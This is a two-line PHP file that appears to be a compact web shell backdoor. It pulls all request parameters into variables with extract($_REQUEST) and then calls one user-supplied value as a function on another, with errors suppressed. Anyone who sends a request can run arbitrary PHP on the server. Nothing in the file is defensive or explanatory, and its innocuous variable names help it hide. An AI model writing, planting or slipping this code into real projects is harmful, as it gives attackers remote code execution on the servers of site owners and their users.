<?php
extract($_REQUEST) && @$except(stripslashes($not)) && exit;